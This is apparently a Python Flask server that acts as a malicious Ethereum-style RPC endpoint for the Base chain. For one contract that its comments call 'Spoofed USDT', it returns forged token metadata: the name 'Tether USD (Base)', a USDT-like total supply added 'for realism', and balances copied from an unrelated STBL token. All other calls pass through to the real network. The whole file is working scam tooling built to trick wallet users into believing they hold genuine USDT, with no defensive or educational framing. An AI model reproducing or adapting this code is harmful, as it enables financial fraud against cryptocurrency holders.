from flask import Flask, request, jsonify
import requests
import os
from web3 import Web3

app = Flask(__name__)

# Contract addresses
SPOOFED_USDT = "0xfde4C96c8593536E31F229EA8f37b2ADa2699bb2"  # Spoofed USDT contract
REAL_STBL = "0x50c5725949A6F0c72E6C4a641F24049A917DB0Cb"    # Actual STBL contract

# RPC settings
BASE_RPC = "https://mainnet.base.org"
w3 = Web3(Web3.HTTPProvider(BASE_RPC))

# Extended ERC20 ABI with name and totalSupply
ERC20_ABI = [
    {"constant": True, "inputs": [{"name": "_owner", "type": "address"}], "name": "balanceOf", "outputs": [{"name": "balance", "type": "uint256"}], "type": "function"},
    {"constant": True, "inputs": [], "name": "decimals", "outputs": [{"name": "", "type": "uint8"}], "type": "function"},
    {"constant": True, "inputs": [], "name": "symbol", "outputs": [{"name": "", "type": "string"}], "type": "function"},
    {"constant": True, "inputs": [], "name": "name", "outputs": [{"name": "", "type": "string"}], "type": "function"},
    {"constant": True, "inputs": [], "name": "totalSupply", "outputs": [{"name": "", "type": "uint256"}], "type": "function"}
]

# Initialize STBL contract
stbl_contract = w3.eth.contract(address=Web3.to_checksum_address(REAL_STBL), abi=ERC20_ABI)

# Cache STBL decimals for reliability
try:
    STBL_DECIMALS = stbl_contract.functions.decimals().call()
except Exception:
    STBL_DECIMALS = 6  # Fallback to 6 if STBL query fails

# USDT-like total supply (e.g., ~100B USDT as of 2025, in wei-like units)
USDT_TOTAL_SUPPLY = 100_000_000_000 * (10 ** 6)

@app.route('/rpc', methods=['POST'])
def handle_rpc():
    data = request.get_json()
    method = data.get("method")
    call_id = data.get("id", 1)

    # Basic chain ID and wallet methods
    if method == "eth_chainId":
        return jsonify({"jsonrpc": "2.0", "id": call_id, "result": "0x2105"})
    if method in ["wallet_switchEthereumChain", "wallet_addEthereumChain"]:
        return jsonify({"jsonrpc": "2.0", "id": call_id, "result": "0x2105" if method == "wallet_switchEthereumChain" else True})

    # Handle eth_call for the spoofed USDT contract
    if method == "eth_call" and data.get("params") and len(data["params"]) > 0:
        call_obj = data["params"][0]
        if call_obj.get("to") and call_obj["to"].lower() == SPOOFED_USDT.lower():
            data_field = call_obj.get("data", "")
            if not data_field:
                return jsonify({"jsonrpc": "2.0", "id": call_id, "result": "0x"})

            function_signature = data_field[:10]

            # balanceOf (0x70a08231)
            if function_signature == "0x70a08231":
                try:
                    address = Web3.to_checksum_address("0x" + data_field[34:74])  # Extract address
                    real_balance = stbl_contract.functions.balanceOf(address).call()
                    # Adjust balance if STBL decimals differ from USDT (6)
                    if STBL_DECIMALS != 6:
                        real_balance = real_balance * (10 ** (6 - STBL_DECIMALS))
                    result = "0x" + hex(real_balance)[2:].zfill(64)
                except Exception as e:
                    app.logger.error(f"Balance query failed: {str(e)}")
                    result = "0x" + hex(0)[2:].zfill(64)  # Default to 0
                return jsonify({"jsonrpc": "2.0", "id": call_id, "result": result})

            # decimals (0x313ce567)
            elif function_signature == "0x313ce567":
                # Always return 6 to match USDT, adjusting balance elsewhere
                result = "0x" + hex(6)[2:].zfill(64)
                return jsonify({"jsonrpc": "2.0", "id": call_id, "result": result})

            # symbol (0x95d89b41)
            elif function_signature == "0x95d89b41":
                # Use "USDT (Base)" to suggest a legitimate variant
                symbol = "USDT (Base)"
                length = len(symbol)
                length_hex = hex(32)[2:].zfill(64)  # Offset to string data
                str_length_hex = hex(length)[2:].zfill(64)
                str_hex = symbol.encode("utf-8").hex().ljust(64, "0")
                result = "0x" + length_hex + str_length_hex + str_hex
                return jsonify({"jsonrpc": "2.0", "id": call_id, "result": result})

            # name (0x06fdde03)
            elif function_signature == "0x06fdde03":
                name = "Tether USD (Base)"
                length = len(name)
                length_hex = hex(32)[2:].zfill(64)
                str_length_hex = hex(length)[2:].zfill(64)
                str_hex = name.encode("utf-8").hex().ljust(64, "0")
                result = "0x" + length_hex + str_length_hex + str_hex
                return jsonify({"jsonrpc": "2.0", "id": call_id, "result": result})

            # totalSupply (0x18160ddd)
            elif function_signature == "0x18160ddd":
                # Return a USDT-like total supply for realism
                result = "0x" + hex(USDT_TOTAL_SUPPLY)[2:].zfill(64)
                return jsonify({"jsonrpc": "2.0", "id": call_id, "result": result})

    # Forward other requests to Base RPC
    response = requests.post(BASE_RPC, json=data, headers={"Content-Type": "application/json"})
    return jsonify(response.json())

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port, debug=False)
